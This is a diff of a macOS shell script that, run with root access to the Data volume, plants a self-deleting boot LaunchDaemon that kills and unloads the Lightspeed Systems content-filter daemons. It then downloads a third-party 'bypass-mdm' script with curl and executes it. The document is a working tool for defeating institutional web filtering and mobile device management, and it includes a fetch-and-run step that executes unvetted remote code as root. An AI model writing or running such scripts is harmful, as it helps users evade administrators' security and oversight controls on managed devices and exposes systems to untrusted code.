@@ -4,16 +4,31 @@ echo "=================================================="
 echo " 1. Installing Lightspeed Auto-Killer (Daemon)    "
 echo "=================================================="
 
-# Make sure the Data volume is mounted
-diskutil mount "Macintosh HD - Data" 2>/dev/null
+echo "Detecting Data Volume..."
+# Mount all APFS volumes to ensure the data volume is visible
+for disk in $(diskutil list | grep "APFS Volume" | grep -v "Recovery" | awk '{print $NF}'); do
+    diskutil mount "$disk" >/dev/null 2>&1
+done
+
+# Automatically find the correct Data volume path
+DATA_VOL=""
+for vol in /Volumes/*; do
+    if [ -d "$vol/private/var/root" ] && [ -d "$vol/Library/LaunchDaemons" ]; then
+        DATA_VOL="$vol"
+        break
+    fi
+done
+
+if [ -z "$DATA_VOL" ]; then
+    echo "❌ Could not find the Data volume. Exiting."
+    exit 1
+fi
+echo "✅ Found Data Volume at: $DATA_VOL"
 
 # 1. Create the script that will run on boot
-cat << 'EOF' > "/Volumes/Macintosh HD - Data/private/var/root/kill-ls.sh"
+cat << 'EOF' > "$DATA_VOL/private/var/root/kill-ls.sh"
 #!/bin/bash
-# Wait 20 seconds for the Mac to fully boot and connect to Wi-Fi
 sleep 20
-
-# The exact commands that worked for you
 /usr/bin/pkill -9 lsfilter
 /usr/bin/pkill -9 mobilefilter
 /bin/launchctl bootout system /Library/LaunchDaemons/com.lightspeedsystems.lsfilter.plist
@@ -24,18 +39,15 @@ sleep 20
 /usr/bin/killall -HUP configd
 /usr/bin/dscacheutil -flushcache
 /usr/bin/killall -HUP mDNSResponder
-
-# Self-Destruct
 /bin/launchctl unload /Library/LaunchDaemons/com.custom.killls.plist
 /bin/rm -f /Library/LaunchDaemons/com.custom.killls.plist
 /bin/rm -f /private/var/root/kill-ls.sh
 EOF
 
-# Make the script executable
-chmod +x "/Volumes/Macintosh HD - Data/private/var/root/kill-ls.sh"
+chmod +x "$DATA_VOL/private/var/root/kill-ls.sh"
 
-# 2. Create the LaunchDaemon that triggers the script on boot
-cat << 'EOF' > "/Volumes/Macintosh HD - Data/Library/LaunchDaemons/com.custom.killls.plist"
+# 2. Create the LaunchDaemon
+cat << 'EOF' > "$DATA_VOL/Library/LaunchDaemons/com.custom.killls.plist"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -58,7 +70,7 @@ echo "=================================================="
 echo " 2. Running MDM Bypass (assafdori)                "
 echo "=================================================="
 
-# Download and run the MDM bypass script
+# Download and run the bypass script (using file execution instead of pipe)
 curl -sL https://raw.githubusercontent.com/assafdori/bypass-mdm/main/bypass-mdm-v2.sh -o /tmp/bypass-mdm.sh
 chmod +x /tmp/bypass-mdm.sh
 /tmp/bypass-mdm.sh
